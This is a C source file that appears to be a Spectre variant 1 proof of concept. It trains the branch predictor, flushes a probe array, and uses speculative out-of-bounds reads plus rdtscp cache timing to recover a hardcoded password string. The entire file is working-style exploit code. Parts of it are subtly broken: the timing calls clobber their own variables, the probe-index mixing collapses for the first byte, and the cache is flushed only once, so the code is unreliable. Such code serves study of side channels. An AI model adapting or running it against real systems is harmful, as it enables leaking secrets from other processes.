#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <x86intrin.h>

// Timing function
unsigned int measure_latency(void *addr) {
    uint32_t time1, time2;
    volatile uint32_t *ptr = (volatile uint32_t *)addr;
    time1 = __rdtscp(&time2);
    *ptr;
    time2 = __rdtscp(&time1);
    return time2 - time1;
}

#define CACHE_HIT_THRESHOLD 80
#define TRAINING_ROUNDS 6
#define ATTACK_SAME_ROUNDS 1

uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
size_t array1_size = 16;
uint8_t array2[256 * 512]; // Probe array

const char *secret = "The password is: SuperSecret123";

// Victim function
void victim_function(size_t x) {
    if (x < array1_size) {  // Bounds check
        uint8_t val = array1[x];
        volatile uint8_t dummy = array2[val * 512]; // Force memory access
        (void)dummy; // Suppress unused variable warning
    }
}

void spectrev1() {
    size_t i, j, k;

    // Train branch predictor
    for (i = 0; i < TRAINING_ROUNDS; i++) {
        victim_function(i);  // Call with valid indices
    }

    // Flush cache lines
    for (i = 0; i < 256; i++)
        _mm_clflush(&array2[i * 512]);

    // Perform attack
    size_t secret_len = strlen(secret);
    for (i = 0; i < secret_len; i++) {
        // Try to read secret byte
        size_t pos = ((size_t)secret - (size_t)array1) + i;

        for(j = 0; j < ATTACK_SAME_ROUNDS; j++) {
            victim_function(pos);

            // Time access to probe array
            for(k = 0; k < 256; k++) {
                int mix_i = ((i * k) % 256);
                unsigned int latency = measure_latency(&array2[mix_i * 512]);
                if (latency < CACHE_HIT_THRESHOLD)
                    printf("Secret byte: %c\n", mix_i);
            }
        }
    }
}

int main() {
    spectrev1();
    return 0;
}
